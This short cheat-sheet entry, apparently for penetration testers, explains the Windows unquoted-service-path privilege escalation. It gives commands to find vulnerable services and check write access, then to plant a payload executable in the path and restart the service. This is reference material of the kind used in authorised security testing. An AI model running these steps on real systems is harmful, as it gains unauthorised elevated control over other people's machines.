# Unquoted Service Path

If a service's binary path contains spaces and isn't wrapped in quotes, Windows tries each space-delimited segment in turn as a possible executable — plant a payload at the first one you can write to and it runs with the service's privileges on next start:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"   # look for an unquoted path containing a space
icacls "C:\Program Files\Vendor Name"                                               # confirm you have write access to the parent dir
```
```
# ImagePath: C:\Program Files\Vendor Name\Service Binary\service.exe
# Windows tries, in order:  C:\Program.exe  ->  C:\Program Files\Vendor.exe  ->  C:\Program Files\Vendor Name\Service.exe  -> ...
copy payload.exe "C:\Program Files\Vendor Name\Service.exe"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```
`sharpup audit`/`PrivescCheck` flag this directly — look for "Unquoted Service Path" in the output rather than hunting manually. A service account with a dependent executable path logged as "missing" (check that service's own log/event output) is the same bug from the other direction — plant the expected binary name instead of hijacking the quoted path.
